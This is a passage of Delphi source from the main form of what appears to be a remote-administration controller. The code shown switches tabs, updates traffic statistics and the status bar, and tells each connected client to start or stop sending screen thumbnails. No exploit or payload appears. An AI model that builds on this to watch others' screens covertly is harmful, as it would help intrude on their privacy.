      TabSet_1.TabIndex := 2;
    end;
  end;
end;

procedure TMainForm.TabSet_1Change(Sender: TObject; NewTab: Integer; var AllowChange: Boolean);
begin
  PageControl_Main.ActivePageIndex := NewTab;
  FormResize(Self);
end;

procedure TMainForm.Timer_StatsTimer(Sender: TObject);
begin
  UpdateStats;
end;

procedure TMainForm.SwitchBalloonHintState(b: Boolean);
begin
  g_ShowBalloonHint := b;
  CheckBox_ShowBallontip.Checked := b;
  MenuItem_EnableBalloontip1.Checked := b;
end;

procedure TMainForm.SwitchThumbnailState(b: Boolean);
var
  i: Integer;
begin
  g_ShowThumbnail := b;
  MenuItem_thumbnail.Checked := g_ShowThumbnail;
  CheckBox_Thumbnail.Checked := g_ShowThumbnail;

  if g_ShowThumbnail then
  begin
    for i := 0 to ListView_Connections.Items.Count - 1 do
    begin
      ListView_Connections.Items[i].ImageIndex := -1;
    end;

    ListView_Connections.SmallImages := ImageList_Thumbnail;
    ListView_Connections.Columns.Items[0].Width := 200;

    for i := 0 to ListView_Connections.Items.Count - 1 do
    begin
      TClientContext(ListView_Connections.Items[i].Data).SendCmd(CMD_THUMBANIL_START);
    end;
  end
  else
  begin
    for i := 0 to ListView_Connections.Items.Count - 1 do
    begin
      ListView_Connections.Items[i].ImageIndex := -1;
      TClientContext(ListView_Connections.Items[i].Data).Thumbnail_Index := -1;
      TClientContext(ListView_Connections.Items[i].Data).SendCmd(CMD_THUMBANIL_END);
    end;

    ImageList_Thumbnail.Clear;
    ListView_Connections.SmallImages := ImageList_Flags;
    ListView_Connections.Columns.Items[0].Width := 100;

    for i := 0 to ListView_Connections.Items.Count - 1 do
    begin
      ListView_Connections.Items[i].ImageIndex := TClientContext(ListView_Connections.Items[i].Data).Image_Index;
    end;
  end;
end;

procedure TMainForm.UpdateStats;
var
  sent, recvd, sentu, recvu: Int64;
begin
  sent := FTcpServer.DataMoniter.SentSize;
  recvd := FTcpServer.DataMoniter.RecvSize;
  sentu := g_Sent_UnCompressed;
  recvu := g_Recv_UnCompressed;

  Label_TotalConnections.Caption := Format('Total connections: %d', [g_TotalConnections]);
  Label_TotalAttempts.Caption := Format('Total connection attempts: %d', [g_TotalAttempts]);
  Label_Sent_Compressed.Caption := 'Compressed: ' + SizeToStr(sent);
  Label_Sent_UnCompressed.Caption := 'Uncompressed: ' + SizeToStr(sentu);
  if sentu <> 0 then
  begin
    Label_Sent_Ratio.Caption := 'Ratio: ' + IntToStr(sent * 100 div sentu) + ' %';
  end
  else
  begin
    Label_Sent_Ratio.Caption := 'Ratio: 0 %';
  end;
  Label_Recv_Compressed.Caption := 'Compressed: ' + SizeToStr(recvd);
  Label_Recv_UnCpmoressed.Caption := 'Uncompressed: ' + SizeToStr(recvu);
  if recvu <> 0 then
  begin
    Label_Recv_Ratio.Caption := 'Ratio: ' + IntToStr(recvd * 100 div recvu) + ' %';
  end
  else
  begin
    Label_Recv_Ratio.Caption := 'Ratio: 0 %';
  end;
end;

procedure TMainForm.UpdateStatusBarAndHint;
var
  port, connections: string;
begin
  port := Format('Port: %d', [g_ListeningPort]);
  connections := Format('Connections(s): %d', [ListView_Connections.Items.Count]);
  StatusBar_1.Panels.Items[2].Text := port;
  StatusBar_1.Panels.Items[3].Text := connections;
  CoolTrayIcon1.Hint := port + #13#10 + connections;
end;

end.

